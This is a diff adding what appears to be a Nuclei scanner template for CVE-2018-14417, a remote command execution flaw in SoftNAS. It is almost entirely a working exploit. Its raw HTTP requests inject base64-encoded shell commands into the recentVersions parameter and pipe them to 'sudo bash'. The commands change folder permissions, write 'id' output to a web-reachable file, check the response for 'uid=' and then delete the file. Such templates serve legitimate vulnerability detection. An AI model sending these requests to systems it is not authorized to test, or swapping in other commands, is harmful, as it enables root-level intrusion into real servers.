@@ -1,0 +1,52 @@
+id: CVE-2018-14417
+info:
+  name: SoftNAS system snserv.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SoftNASCloud® is a data control and management platform. The recentVersions parameter of the system /softnas/snserver/snserv.php file has a remote command execution vulnerability, allowing attackers to execute arbitrary system commands.
+  classification:
+    cve-id: CVE-2018-14417
+    cvss-metrics: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,command-execution
+  reference:
+    - https://www.exploit-db.com/exploits/45097/
+    - https://www.softnas.com
+
+variables:
+  cmd_payload: "Y2htb2QgNzU1IC92YXIvd3d3L3NvZnRuYXMvaW1hZ2VzIDsgaWQgPiAvdmFyL3d3dy9zb2Z0bmFzL2ltYWdlcy92dWwxMy50eHQ="
+  remove_payload: "cm0gLWYgL3Zhci93d3cvc29mdG5hcy9pbWFnZXMvdnVsMTMudHh0"
+
+http:
+  - raw:
+      - |
+        GET /softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+{{cmd_payload}}+%7C+base64+-d+%7C+sudo+bash; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+
+    unsafe: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /softnas/images/vul13.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+
+  - raw:
+      - |
+        GET /softnas/snserver/snserv.php?opcode=checkupdate&opcode=executeupdate&selectedupdate=4.0.1aaaaaaa.1aaaaaaaaaaaaaa&update_type=standard&recentVersions=4.0.3aaaaaaaaaaa.1aaaaaaa;echo+{{remove_payload}}+%7C+base64+-d+%7C+sudo+bash; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+
+    unsafe: true
